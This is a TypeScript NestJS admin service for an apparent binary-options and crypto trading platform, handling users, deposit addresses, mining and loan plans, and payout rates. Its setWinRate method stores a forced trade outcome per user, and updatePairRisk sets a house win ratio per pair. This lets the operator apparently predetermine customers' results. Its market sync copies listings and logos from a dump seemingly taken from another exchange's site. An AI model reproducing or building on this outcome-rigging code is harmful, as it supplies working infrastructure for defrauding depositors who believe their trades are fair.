import { Injectable, Logger, NotFoundException, BadRequestException } from '@nestjs/common';
import { PrismaService } from '../prisma/prisma.service';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { RealDataSeeder } from '../utils/real-data-seeder';

@Injectable()
export class AdminService {
  private readonly logger = new Logger(AdminService.name);

  constructor(private readonly prisma: PrismaService) { }

  // --- Dashboard & Stats ---

  async getAdminStats() {
    const totalVolume = await this.prisma.binaryOptionPosition.aggregate({
      _sum: { amount: true },
    });
    const activeUsers = await this.prisma.user.count();
    const avgPayout = await this.prisma.binaryTimeframe.aggregate({
      _avg: { payoutRate: true }
    });

    return {
      totalVolume: totalVolume._sum.amount || 0,
      activeUsers,
      globalPayoutRate: avgPayout._avg.payoutRate || 1.85
    };
  }

  async getSystemConfig() {
    // Get timeframes and pair stats
    const timeframes = await this.prisma.binaryTimeframe.findMany({ orderBy: { seconds: 'asc' } });
    const marketStats = await this.prisma.binaryPair.groupBy({ by: ['category'], _count: true });

    // Get generic system config
    const configs = await this.prisma.systemConfig.findMany();
    const configMap = configs.reduce((acc, curr) => ({ ...acc, [curr.key]: curr.value }), {});

    return {
      status: 'ok',
      timeframes,
      marketStats,
      config: configMap
    };
  }

  async updateSystemConfig(key: string, value: string, description?: string) {
    return this.prisma.systemConfig.upsert({
      where: { key },
      update: { value, description },
      create: { key, value, description }
    });
  }

  // --- User Management ---

  async getUsers() {
    return this.prisma.user.findMany({
      include: { wallet: true },
      orderBy: { createdAt: 'desc' }
    });
  }

  async setWinRate(userId: string, outcome: string) {
    return this.prisma.user.update({
      where: { id: userId },
      data: { forceOutcome: outcome }
    });
  }

  // --- Crypto Management ---

  async getCurrencies() {
    return this.prisma.currency.findMany({
      orderBy: { id: 'asc' },
      include: { depositAddresses: true }
    });
  }

  async updateCurrency(id: number, data: any) {
    return this.prisma.currency.update({
      where: { id },
      data
    });
  }

  async createCurrency(data: any) {
    return this.prisma.currency.create({ data });
  }

  async addDepositAddress(currencyId: number, network: string, address: string, label?: string) {
    return this.prisma.depositAddress.create({
      data: {
        currencyId,
        network,
        address,
        label
      }
    });
  }

  async deleteDepositAddress(id: string) {
    return this.prisma.depositAddress.delete({ where: { id } });
  }

  // --- Mining Management ---

  async getMiningPlans() {
    return this.prisma.miningPlan.findMany({ orderBy: { lockupPeriod: 'asc' } });
  }

  async createMiningPlan(data: any) {
    return this.prisma.miningPlan.create({ data });
  }

  async updateMiningPlan(id: string, data: any) {
    return this.prisma.miningPlan.update({ where: { id }, data });
  }

  // --- Loan Management ---

  async getLoanPlans() {
    return this.prisma.loanPlan.findMany({ orderBy: { durationDays: 'asc' } });
  }

  async createLoanPlan(data: any) {
    return this.prisma.loanPlan.create({ data });
  }

  async updateLoanPlan(id: string, data: any) {
    return this.prisma.loanPlan.update({ where: { id }, data });
  }

  // --- Risk Management ---

  async getBinaryPairs() {
    return this.prisma.binaryPair.findMany({
      orderBy: { symbol: 'asc' }
    });
  }

  async updatePairRisk(symbol: string, houseWinRatio: number) {
    return this.prisma.binaryPair.update({
      where: { symbol },
      data: { houseWinRatio }
    });
  }

  async syncReal() {
    this.logger.log('Starting Live Sync...');
    await RealDataSeeder.syncMarketData();
    await RealDataSeeder.syncBinaryConfigs();
    return { status: 'ok', message: 'Live Sync Completed' };
  }

  async syncMarkets() {
    this.logger.log('Starting Market Sync from Dump...');
    const dumpPath = path.join(process.cwd(), 'scripts', 'dexixz_dump', 'hb_list.json');

    if (!fs.existsSync(dumpPath)) {
      throw new NotFoundException('Market dump file not found');
    }

    const raw = fs.readFileSync(dumpPath, 'utf-8');
    const data = JSON.parse(raw);
    const markets = data.message || [];
    const categoryMap: Record<number, string> = { 0: 'crypto', 1: 'stock', 2: 'forex', 3: 'metal' };

    let synced = 0;
    for (const m of markets) {
      const category = categoryMap[m.coin_type] || 'other';
      const symbol = `${m.currency_name}/${m.legal_name}`;
      let logo = m.logo;
      if (logo && logo.startsWith('/')) logo = `https://www.coindefgie15eg.qpon${logo}`;

      await this.prisma.binaryPair.upsert({
        where: { symbol },
        update: {
          rate: 1.85,
          category,
          logo,
          isActive: m.is_show === 1,
          realId: m.id,
          matchId: m.match_id,
          currencyId: m.currency_id,
          coinType: m.coin_type,
        },
        create: {
          symbol,
          baseAsset: m.currency_name,
          quoteAsset: m.legal_name,
          rate: 1.85,
          category,
          logo,
          isActive: m.is_show === 1,
          realId: m.id,
          matchId: m.match_id,
          currencyId: m.currency_id,
          coinType: m.coin_type,
        },
      });
      synced++;
    }
    await this.seedDefaults();
    return { status: 'ok', message: `Synced ${synced} markets.` };
  }

  async updateGlobalPayout(rate: number) {
    await this.prisma.binaryTimeframe.updateMany({ data: { payoutRate: rate } });
    return { message: `Global payout rate updated to ${rate}` };
  }

  private async seedDefaults() {
    const timeframes = [
      { name: '30s', seconds: 30, payoutRate: 1.80 },
      { name: '1m', seconds: 60, payoutRate: 1.85 },
      { name: '5m', seconds: 300, payoutRate: 1.90 },
      { name: '15m', seconds: 900, payoutRate: 1.95 },
      { name: '1h', seconds: 3600, payoutRate: 2.00 },
    ];

    for (const tf of timeframes) {
      await this.prisma.binaryTimeframe.upsert({
        where: { seconds: tf.seconds },
        update: { name: tf.name, payoutRate: tf.payoutRate },
        create: tf,
      });
    }
  }
}
